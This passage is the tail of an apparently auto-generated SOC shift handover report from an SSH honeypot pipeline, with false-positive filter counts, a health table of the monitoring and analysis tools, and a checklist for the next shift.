| AbuseIPDB score 19 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 130 cases |
| Tool 34  | Credential Extractor        | ✅ 35 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 40 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 24 filtered (18.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 31 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 18 priority case(s) shown individually · 24 recon entry/entries in table (4 group(s) consolidating 68 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-14T10:23:49Z_
